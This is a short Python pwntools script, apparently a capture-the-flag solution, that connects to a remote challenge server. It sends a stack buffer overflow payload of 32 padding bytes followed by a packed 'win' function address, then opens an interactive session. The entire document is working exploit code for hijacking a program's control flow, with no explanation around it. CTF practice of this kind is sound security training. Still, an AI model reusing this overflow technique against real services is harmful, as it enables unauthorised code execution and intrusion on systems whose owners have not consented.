#!/usr/bin/env python3

from pwn import *
import struct

io = remote("pwn2.ihack.sibersiaga.my", 1389)

pad = b"A" * 32
win = struct.pack("<I", 0x804988B)
payload = pad + win

io.sendlineafter(b"text:\n", payload)

io.interactive()
